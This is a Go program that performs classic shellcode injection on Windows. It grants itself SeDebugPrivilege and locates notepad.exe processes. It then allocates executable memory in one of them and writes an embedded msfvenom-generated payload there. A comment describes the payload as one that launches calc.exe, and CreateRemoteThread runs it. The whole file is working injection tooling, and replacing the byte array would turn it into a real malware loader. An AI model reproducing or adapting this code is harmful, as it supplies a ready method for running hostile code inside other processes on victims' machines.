package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func setSeDebugPrivilege() {
	// Get current process (the one I wanna change)
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current process token
	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
	fmt.Printf("Length is %d\n", tokPrivLen)
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, tokPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Debug Priviledge granted")
}

func main() {
	var (
		target    = "notepad.exe"
		targetIDs []uint32
	)

	// msfvenom -p windows/exec CMD=calc.exe
	targetShellcode := [320]byte{
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0xd9, 0xc6, 0xd9, 0x74, 0x24, 0xf4, 0x5b, 0x31, 0xc9, 0xbd, 0xa5, 0x68,
		0x08, 0xdd, 0xb1, 0x31, 0x31, 0x6b, 0x18, 0x83, 0xc3, 0x04, 0x03, 0x6b, 0xb1, 0x8a,
		0xfd, 0x21, 0x51, 0xc8, 0xfe, 0xd9, 0xa1, 0xad, 0x77, 0x3c, 0x90, 0xed, 0xec, 0x34,
		0x82, 0xdd, 0x67, 0x18, 0x2e, 0x95, 0x2a, 0x89, 0xa5, 0xdb, 0xe2, 0xbe, 0x0e, 0x51,
		0xd5, 0xf1, 0x8f, 0xca, 0x25, 0x93, 0x13, 0x11, 0x7a, 0x73, 0x2a, 0xda, 0x8f, 0x72,
		0x6b, 0x07, 0x7d, 0x26, 0x24, 0x43, 0xd0, 0xd7, 0x41, 0x19, 0xe9, 0x5c, 0x19, 0x8f,
		0x69, 0x80, 0xe9, 0xae, 0x58, 0x17, 0x62, 0xe9, 0x7a, 0x99, 0xa7, 0x81, 0x32, 0x81,
		0xa4, 0xac, 0x8d, 0x3a, 0x1e, 0x5a, 0x0c, 0xeb, 0x6f, 0xa3, 0xa3, 0xd2, 0x40, 0x56,
		0xbd, 0x13, 0x66, 0x89, 0xc8, 0x6d, 0x95, 0x34, 0xcb, 0xa9, 0xe4, 0xe2, 0x5e, 0x2a,
		0x4e, 0x60, 0xf8, 0x96, 0x6f, 0xa5, 0x9f, 0x5d, 0x63, 0x02, 0xeb, 0x3a, 0x67, 0x95,
		0x38, 0x31, 0x93, 0x1e, 0xbf, 0x96, 0x12, 0x64, 0xe4, 0x32, 0x7f, 0x3e, 0x85, 0x63,
		0x25, 0x91, 0xba, 0x74, 0x86, 0x4e, 0x1f, 0xfe, 0x2a, 0x9a, 0x12, 0x5d, 0x20, 0x5d,
		0xa0, 0xdb, 0x06, 0x5d, 0xba, 0xe3, 0x36, 0x36, 0x8b, 0x68, 0xd9, 0x41, 0x14, 0xbb,
		0x9e, 0xbe, 0x5e, 0xe6, 0xb6, 0x56, 0x07, 0x72, 0x8b, 0x3a, 0xb8, 0xa8, 0xcf, 0x42,
		0x3b, 0x59, 0xaf, 0xb0, 0x23, 0x28, 0xaa, 0xfd, 0xe3, 0xc0, 0xc6, 0x6e, 0x86, 0xe6,
		0x75, 0x8e, 0x83, 0x84, 0x18, 0x1c, 0x4f, 0x65, 0xbf, 0xa4, 0xea, 0x79}

	// Grant the process SeDebugPrivilege
	setSeDebugPrivilege()

	// Check to find the process id (PID) we are interested in
	processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(processesSnap)
	if err != nil {
		log.Fatal(err)
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = windows.Process32First(processesSnap, &pe32)
	if err != nil {
		log.Fatal(err)
	}
	for {
		if pe32.ProcessID > 0 {
			processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
			if processName == target {
				targetIDs = append(targetIDs, pe32.ProcessID)
			}
		}
		err = windows.Process32Next(processesSnap, &pe32)
		if err != nil {
			break
		}
	}

	for _, targetID := range targetIDs {
		// Now that we have the PID of the process we want to target, we can get a handle to it
		// Since some SYSTEM processes seem not to be injectable, I iterate over all the results I find
		// until I find an injectable process
		victimProcess, err := windows.OpenProcess(
			windows.PROCESS_CREATE_THREAD|
				windows.PROCESS_VM_WRITE|
				windows.PROCESS_VM_READ|
				windows.PROCESS_VM_OPERATION,
			false, targetID)

		defer windows.CloseHandle(victimProcess)
		if err == nil {
			fmt.Printf("[+] Opened victim process %d\n", targetID)

			// Trying to allocate memory on remote process. VirtualAllocEx is not defined on the windows package
			var (
				kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
				virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
				writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
			)
			dwSize := uint32(len(targetShellcode))
			addr, _, err := virtualAllocEx.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				uintptr(dwSize),
				uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
				uintptr(windows.PAGE_EXECUTE_READWRITE))
			if addr == 0 {
				fmt.Println("[-] virtualAllocEx returned NULL")
				log.Fatal(err)
			}

			// Trying to write the shellcode to the allocated memory
			var writtenBytes uint64 = 0
			r1, _, err := writeProcessMemory.Call(
				uintptr(victimProcess),
				uintptr(addr),
				uintptr(unsafe.Pointer(&targetShellcode[0])),
				uintptr(dwSize),
				uintptr(unsafe.Pointer(&writtenBytes)),
			)
			if r1 == 0 {
				fmt.Println("[-] writeProcessMemory failed")
				//log.Fatal(err)
			}
			fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)

			// Create remote thread and launch our shellcode. CreateRemoteThread is not defined by the windows package
			createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
			r1, _, err = createRemoteThread.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				0,
				uintptr(addr), // Unilke DLL injection, we start directly from the shellcode and we don't pass parameters
				uintptr(unsafe.Pointer(nil)),
				0,
				uintptr(unsafe.Pointer(nil)))
			if r1 == 0 {
				fmt.Println("[-] Failed to launch remote thread")
				log.Fatal(err)
			}
			handle := windows.Handle(r1)
			windows.WaitForSingleObject(handle, windows.INFINITE)
			break
		} else {
			fmt.Printf("[-] Failed to open victim process %d, trying another one\n", targetID)
		}
	}
}
